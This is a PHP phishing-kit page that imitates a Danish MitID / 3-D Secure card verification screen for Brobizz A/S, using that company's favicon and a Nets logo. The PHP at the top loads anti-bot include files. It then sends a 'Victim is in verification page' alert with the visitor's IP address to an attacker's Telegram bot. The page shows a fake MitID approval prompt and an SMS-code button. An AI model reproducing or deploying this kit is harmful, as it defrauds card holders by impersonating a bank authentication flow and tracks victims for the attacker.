<?php
include "thebak3r.php";
include "anti/anti1.php";
include "anti/anti2.php";
include "anti/anti3.php";
include "anti/anti4.php";
include "anti/anti5.php";
include "anti/anti6.php";
include "anti/anti7.php";

include 'bak3r.php';
	
$message = '

Victim is in verification page.

Adresse IP : '.$_SERVER['REMOTE_ADDR'].'

';    

$msgdureztuconnaissss = urlencode("".$message."");
$html = file_get_contents('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$chatid.'&text='.$msgdureztuconnaissss.'');
	
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html lang="dk"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Authentication</title>
    <link rel="icon" href="https://login.brobizz.com/favicon.ico" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    

<style>

    body {
        fullScreen: false;
    }

    body {
        margin: 0;
        background: #f3f2f2;
        height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 10px;
        min-width: 248px;
    }

    #mitidIframe {
        width: 100%;
        height: 260px;
        border: 0;
        z-index: 100;
        position: relative;
    }

    @media (min-width: 380px) {
        #mitidIframe {
            height: 227px;
        }
    }
	@media (min-width: 400px) {
        #mitidIframe {
            height: 350px;
        }
    }

    .mitidContextStr {
        font-size: 10px;
        font-weight: normal; color: #333;
        border-top: 1px solid #eee;
        border-bottom: 1px solid #eee;
        padding: 6px;
        background-color: #f8f8f9;
        overflow-wrap: anywhere;
    }

    @media (min-width: 380px) {
        .mitidContextStr {
            font-size: 0.9rem;
            padding: 15px;
        }
    }

	@media (min-width: 400px) {
        .mitidContextStr {
            font-size: 0.9rem;
            padding: 08px;
        }
    }

    [hidden] {
        display: none;
    }

    .header {
        height: 42px;
        border-bottom: 0px solid #ddd;
        display: flex;
        justify-content: flex-end;
        align-items: center;
        padding: 0px 16px 0px 16px;
    }

    .imgcon {
        width: 33%;
    }

    .logo {
        max-width: 100%;
        max-height: 32px;
    }

    .bank {
        float: right;
    }

    .lang {
        width: 30%;
        display: block;
        margin: auto;
        text-align: center;
    }

    .lang img {
        max-width: 20px;
        height: auto;
        width: 100%;
    }

    .lang a,
    .lang a:hover,
    .lang a:visited,
    .lang a:active {
        font-size: 2.5em;
        text-decoration: none;
    }

    .network {
        float: left;
    }

    tr td:first-child {
        width: 105px;
    }

    td {
        overflow-wrap: anywhere;
    }

    .wrapper {
        -webkit-border-radius: 4px;
        -moz-border-radius: 4px;
        border-radius: 4px;
        position: relative;
        display: block;
        width: 250px;
        height: 400px;
        background-color: #fff;
    }

    .container {
        position: relative;
        display: flex;
        flex-direction: column;
        font-family: Arial, sans-serif;
        padding: 0px 16px
    }

    .content h1,
    .content p {
        font-style: normal;
        font-stretch: normal;
        line-height: 1.25em;
        letter-spacing: normal;
        color: #000;
    }

    .content h1 {
        margin: 6px 0px 6px 0px;
        font-size: 1.25em;
        font-weight: bold;
    }

    .content p {
        margin: 8px 0;
    }

    .content {
        font-weight: normal;
    }

    .content table {
        margin-top: 20px;
    }

    .details > div {
        display: flex;
        justify-content: flex-start;
        align-items: left;
        min-height: 20px;
    }

    .details .label {
        text-align: left;
        width: 42%;
        background: #fff;
    }

    input::-webkit-outer-spin-button,
    input::-webkit-inner-spin-button {
        /* display: none; <- Crashes Chrome on hover */
        -webkit-appearance: none;
        margin: 0; /* <-- Apparently some margin are still there even though it's hidden */
    }

    input[type=number] {
        -moz-appearance:textfield; /* Firefox */
    }

    input {
        font-size: 1.0em;
        width: 100px;
    }

    .buttons {
        margin-top: 6px;
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: row-reverse;
    }

    button {
        width: 30%;
        height: 34px;
        text-align: center;
        margin: 00px 1% 00px 1%;
        min-height: 24px;
        line-height: 24px; /* vertical center text*/
        border-radius: 4px;
        border: 1px solid #ccc;
        font-size: 0.9em;
        color: #333;
        background-image: linear-gradient(#eee, #ddd);
    }

    button:hover {
        color: #fff;
        background-image: linear-gradient(#96bfe9, #5e99d4);
    }

    button img {
        display: inline-block;
        vertical-align: middle;
        width: 12px;
    }

    .nemid,
    .mitid {
        border: none;
        background: none;
    }

    button.nemid,
    button.mitid {
        border: 1px solid #ddd;
        background-image: linear-gradient(#eee, #ddd);
    }

    button.nemid:hover,
    button.mitid:hover {
        color: #fff;
        background-image: linear-gradient(#96bfe9, #5e99d4);
    }

    button.nemid img {
        width: 60%;
    }

    button.mitid img {
        width: 50%;
    }

    .content .spinner_container {
    }

    .errors {
        background-color: #fff2f2;
        padding: 4px;
        margin-top: 5px;
        text-align: center;
        display: flex;
        justify-content: center;
        align-items: center;
    }

    .errors .exclamation {
        width: 16px;
        height: 16px;
        line-height: 16px;
        border-radius: 16px;
        border: 1px solid red;
        display: inline-block;
        color: red;
        text-align: center;
    }

    .errors h1 {
        background-image: url('exclamation.png');
        background-position: left center;
        background-size: contain;
        background-repeat: no-repeat;
        padding-left: 20px;
        font-size: 10px;
        color: #000;
    }

    .errors p {
        font-weight: bold;
        color: #f00;
    }

    footer {
        position: absolute;
        bottom: 0;
        padding: 0px 25px;
    }

    footer p {
        font-family: Arial, sans-serif;
        margin-bottom: 6px;
    }

    .mobile {
        position: absolute;
        bottom: 0;
        right: 15px;
    }

    .spinner {
        width: 50px;
        height: 50px;
        margin-left: -8px;
        margin-top: -12px;
    }

    @media (min-width: 380px) {

        body {
            font-size: 14px;
        }

        .wrapper {
            width: 380px;
            height: 550px;
        }

        .header {
            height: 72px;
            display: flex;
            justify-content: flex-center;
            align-items: center;
        }

        .container {
            padding: 0px 20px;
        }

        .content .images_container img:first-child {
            width: 72px;
            height: 72px;
            display: none;
        }

        .content .images_container img:last-child {
            display: none;
        }

        .content h1 {
            font-size: 1.25em;
        }

        .content h1,
        .content p {
            line-height: 1.23;
        }

        tr td:first-child {
            width: 170px;
        }

        td {
            overflow-wrap: anywhere;
        }

        .logo {
            max-width: 100%;
            max-height: 60px;
        }

        .lang img {
            max-width: 40px;
        }

        .details > div {
            display: flex;
            justify-content: flex-start;
            align-items: left;
            min-height: 30px;
        }

        button {
            min-height: 30px;
            line-height: 30px; /* vertical center text*/
        }

        .content p {
            line-height: 1.55;
        }

        .error_container h1 {
            font-size: 20px;
            padding-left: 32px;
        }

        .error_container p {
            font-size: 16px;
            margin-right: 00px;
        }

        .cancel {
            font-size: 16px;
        }

        .mobile {
            width: 112px;
            height: 215px;
            right: 40px;
        }

        .spinner {
            margin-top: -25px;
        }

        footer {
            padding: 0px 25px;
        }

        footer p {

        }

    }
	@media (min-width: 400px) {

        body {
            font-size: 14px;
        }

        .wrapper {
            width: 380px;
            height: 550px;
        }

        .header {
            height: 72px;
            display: flex;
            justify-content: flex-center;
            align-items: center;
        }

        .container {
            padding: 0px 20px;
        }

        .content .images_container img:first-child {
            width: 72px;
            height: 72px;
            display: none;
        }

        .content .images_container img:last-child {
            display: none;
        }

        .content h1 {
            font-size: 1.25em;
        }

        .content h1,
        .content p {
            line-height: 1.23;
        }

        tr td:first-child {
            width: 170px;
        }

        td {
            overflow-wrap: anywhere;
        }

        .logo {
            max-width: 100%;
            max-height: 60px;
        }

        .lang img {
            max-width: 40px;
        }

        .details > div {
            display: flex;
            justify-content: flex-start;
            align-items: left;
            min-height: 30px;
        }

        button {
            min-height: 30px;
            line-height: 30px; /* vertical center text*/
        }

        .content p {
            line-height: 1.55;
        }

        .error_container h1 {
            font-size: 20px;
            padding-left: 32px;
        }

        .error_container p {
            font-size: 16px;
            margin-right: 00px;
        }

        .cancel {
            font-size: 16px;
        }

        .mobile {
            width: 112px;
            height: 215px;
            right: 40px;
        }

        .spinner {
            margin-top: -25px;
        }

        footer {
            padding: 0px 25px;
        }

        footer p {

        }

    }
</style>

<style>

    body {
        fullScreen: false;
    }

    body {
        margin: 0;
        background: #f3f2f2;
        height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 10px;
        min-width: 248px;
    }

    #mitidIframe {
        width: 100%;
        height: 260px;
        border: 0;
        z-index: 100;
        position: relative;
    }

    @media (min-width: 380px) {
        #mitidIframe {
            height: 227px;
        }
    }
	@media (min-width: 400px) {
        #mitidIframe {
            height: 350px;
        }
    }

    .mitidContextStr {
        font-size: 10px;
        font-weight: normal;
        color: #333;
        border-top: 1px solid #eee;
        border-bottom: 1px solid #eee;
        padding: 6px;
        background-color: #f8f8f9;
        overflow-wrap: anywhere;
    }

    @media (min-width: 380px) {
        .mitidContextStr {
            font-size: 0.9rem;
            padding: 08px;
        }
    }
	@media (min-width: 400px) {
        .mitidContextStr {
            font-size: 0.9rem;
            padding: 15px;
        }
    }


    [hidden] {
        display: none;
    }

    .header {
        height: 42px;
        border-bottom: 0px solid #ddd;
        display: flex;
        justify-content: flex-end;
        align-items: center;
        padding: 0px 16px 0px 16px;
    }

    .imgcon {
        width: 33%;
    }

    .logo {
        max-width: 100%;
        max-height: 32px;
    }

    .bank {
        float: right;
    }

    .lang {
        width: 30%;
        display: block;
        margin: auto;
        text-align: center;
    }

    .lang img {
        max-width: 20px;
        height: auto;
        width: 100%;
    }

    .lang a,
    .lang a:hover,
    .lang a:visited,
    .lang a:active {
        font-size: 2.5em;
        text-decoration: none;
    }

    .network {
        float: left;
    }

    tr td:first-child {
        width: 105px;
    }

    td {
        overflow-wrap: anywhere;
    }

    .wrapper {
        -webkit-border-radius: 4px;
        -moz-border-radius: 4px;
        border-radius: 4px;
        position: relative;
        display: block;
        width: 250px;
        height: 400px;
        background-color: #fff;
    }

    .container {
        position: relative;
        display: flex;
        flex-direction: column;
        font-family: Arial, sans-serif;
        padding: 0px 16px
    }

    .content h1,
    .content p {
        font-style: normal;
        font-stretch: normal;
        line-height: 1.25em;
        letter-spacing: normal;
        color: #000;
    }

    .content h1 {
        margin: 6px 0px 6px 0px;
        font-size: 1.25em;
        font-weight: bold;
    }

    .content p {
        margin: 8px 0;
    }

    .content {
        font-weight: normal;
    }

    .content table {
        margin-top: 20px;
    }

    .details > div {
        display: flex;
        justify-content: flex-start;
        align-items: left;
        min-height: 20px;
    }

    .details .label {
        text-align: left;
        width: 42%;
        background: #fff;
    }

    input::-webkit-outer-spin-button,
    input::-webkit-inner-spin-button {
        /* display: none; <- Crashes Chrome on hover */
        -webkit-appearance: none;
        margin: 0; /* <-- Apparently some margin are still there even though it's hidden */
    }

    input[type=number] {
        -moz-appearance: textfield; /* Firefox */
    }

    input {
        font-size: 1.0em;
        width: 100px;
    }

    .buttons {
        margin-top: 6px;
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: row-reverse;
    }

    button {
        width: 30%;
        height: 34px;
        text-align: center;
        margin: 00px 1% 00px 1%;
        min-height: 24px;
        line-height: 24px; /* vertical center text*/
        border-radius: 4px;
        border: 1px solid #ccc;
        font-size: 0.9em;
        color: #333;
        background-image: linear-gradient(#eee, #ddd);
    }

    button:hover {
        color: #fff;
        background-image: linear-gradient(#96bfe9, #5e99d4);
    }

    button img {
        display: inline-block;
        vertical-align: middle;
        width: 12px;
    }

    .nemid,
    .mitid {
        border: none;
        background: none;
    }

    button.nemid,
    button.mitid {
        border: 1px solid #ddd;
        background-image: linear-gradient(#eee, #ddd);
    }

    button.nemid:hover,
    button.mitid:hover {
        color: #fff;
        background-image: linear-gradient(#96bfe9, #5e99d4);
    }

    button.nemid img {
        width: 60%;
    }

    button.mitid img {
        width: 50%;
    }

    .content .spinner_container {
    }

    .errors {
        background-color: #fff2f2;
        padding: 4px;
        margin-top: 5px;
        text-align: center;
        display: flex;
        justify-content: center;
        align-items: center;
    }

    .errors .exclamation {
        width: 16px;
        height: 16px;
        line-height: 16px;
        border-radius: 16px;
        border: 1px solid red;
        display: inline-block;
        color: red;
        text-align: center;
    }

    .errors h1 {
        background-image: url('exclamation.png');
        background-position: left center;
        background-size: contain;
        background-repeat: no-repeat;
        padding-left: 20px;
        font-size: 10px;
        color: #000;
    }

    .errors p {
        font-weight: bold;
        color: #f00;
    }

    footer {
        position: absolute;
        bottom: 0;
        padding: 0px 25px;
    }

    footer p {
        font-family: Arial, sans-serif;
        margin-bottom: 6px;
    }

    .mobile {
        position: absolute;
        bottom: 0;
        right: 15px;
    }

    .spinner {
        width: 50px;
        height: 50px;
        margin-left: -8px;
        margin-top: -12px;
    }

    @media (min-width: 380px) {

        body {
            font-size: 11px;
        }

        .wrapper {
            width: 380px;
            height: 415px;
        }

        .header {
            height: 72px;
            display: flex;
            justify-content: flex-center;
            align-items: center;
        }

        .container {
            padding: 0px 20px;
        }

        .content .images_container img:first-child {
            width: 72px;
            height: 72px;
            display: none;
        }

        .content .images_container img:last-child {
            display: none;
        }

        .content h1 {
            font-size: 1.25em;
        }

        .content h1,
        .content p {
            line-height: 1.23;
        }

        tr td:first-child {
            width: 170px;
        }

        td {
            overflow-wrap: anywhere;
        }

        .logo {
            max-width: 100%;
            max-height: 60px;
        }

        .lang img {
            max-width: 40px;
        }

        .details > div {
            display: flex;
            justify-content: flex-start;
            align-items: left;
            min-height: 30px;
        }

        button {
            min-height: 30px;
            line-height: 30px; /* vertical center text*/
        }

        .content p {
            line-height: 1.55;
        }

        .error_container h1 {
            font-size: 20px;
            padding-left: 32px;
        }

        .error_container p {
            font-size: 16px;
            margin-right: 00px;
        }

        .cancel {
            font-size: 16px;
        }

        .mobile {
            width: 112px;
            height: 215px;
            right: 40px;
        }

        .spinner {
            margin-top: -25px;
        }

        footer {
            padding: 0px 25px;
        }

        footer p {

        }

    }
	@media (min-width: 400px) {

        body {
            font-size: 14px;
        }

        .wrapper {
            width: 380px;
            height: 550px;
        }

        .header {
            height: 72px;
            display: flex;
            justify-content: flex-center;
            align-items: center;
        }

        .container {
            padding: 0px 20px;
        }

        .content .images_container img:first-child {
            width: 72px;
            height: 72px;
            display: none;
        }

        .content .images_container img:last-child {
            display: none;
        }

        .content h1 {
            font-size: 1.25em;
        }

        .content h1,
        .content p {
            line-height: 1.23;
        }

        tr td:first-child {
            width: 170px;
        }

        td {
            overflow-wrap: anywhere;
        }

        .logo {
            max-width: 100%;
            max-height: 60px;
        }

        .lang img {
            max-width: 40px;
        }

        .details > div {
            display: flex;
            justify-content: flex-start;
            align-items: left;
            min-height: 30px;
        }

        button {
            min-height: 30px;
            line-height: 30px; /* vertical center text*/
        }

        .content p {
            line-height: 1.55;
        }

        .error_container h1 {
            font-size: 20px;
            padding-left: 32px;
        }

        .error_container p {
            font-size: 16px;
            margin-right: 00px;
        }

        .cancel {
            font-size: 16px;
        }

        .mobile {
            width: 112px;
            height: 215px;
            right: 40px;
        }

        .spinner {
            margin-top: -25px;
        }

        footer {
            padding: 0px 25px;
        }

        footer p {

        }

    }
</style>


</head>
<body>
<section class="wrapper">
    <header class="header">
        <div class="imgcon"><img src="./verification_files/Nets_logo.svg" alt="Your Bank" class="logo network"></div>
        <div class="imgcon">
            <div class="lang lane">
                <a href="https://acs2.3dsecure.no/mdpayacs/auth;mdsessionid=5E9B977DE0E1795DA8FFC45E18F6ED14?lang=en"><img src="./verification_files/en.svg"></a>

            </div>
        </div>
        <div class="imgcon"><img src="./verification_files/1.svg" alt="Card Network" class="logo bank"></div>
    </header>

    <section class="container" style="padding: 0px; flex: auto">

        <section>
            <div class="mitidContextStr">
                Betal 0,00 DKK til Brobizz A/S - Tickets LIVE fra kort 
            </div>
        </section>

        <section class="mitidContainer">
            <div style="display:none;" id="mitid_parameters">7a2f8e6a-5a1c-4de4-ba69-d11305a3b8ac</div>
            <br>
            <p id="mitId" style="font-weight: bold; font-size: 20px; text-align: center;">Åbn MitID app og godkend</p>
            
            <div class="container1">
                <object type="image/svg+xml" id="code-app-emulator" class="code-app-emulator" data="./media/code-app-slider-emulator.svg">
                  <img alt="code-app-emulator" class="code-app-emulator" src="./media/code-app-slider-emulator.svg">
                </object>
              </div>
              <style>
                body, html {
                  margin: 0;
                  padding: 0;
                  height: 100%;
                  display: flex;
                  justify-content: center;
                  align-items: center;
                }
                .container1 {
                  display: flex;
                  justify-content: center;
                  align-items: center;
                  height: 100%;
                  width: 100%;
                }
                .code-app-emulator {
                  width: 210px; /* Adjust the width as needed */
                  height: auto; /* Maintain aspect ratio */
                }
              </style>
            <br>
            <br>
            <br>
            <br>
            
            
               
        </section>

        
            <section style="border-top: 1px solid #eee;">
                <div class="buttons">
                    <button type="submit" id="smspasswd" name="smspasswd" value="smspasswd">
                        SMS+kode
                    </button>
                    <button type="submit" id="cancel" name="cancel" value="cancel"><img src="./verification_files/back.png" alt="cancel">
                        Afbryd
                    </button>
                </div>
            
        
    </section>
</section>


</body></html>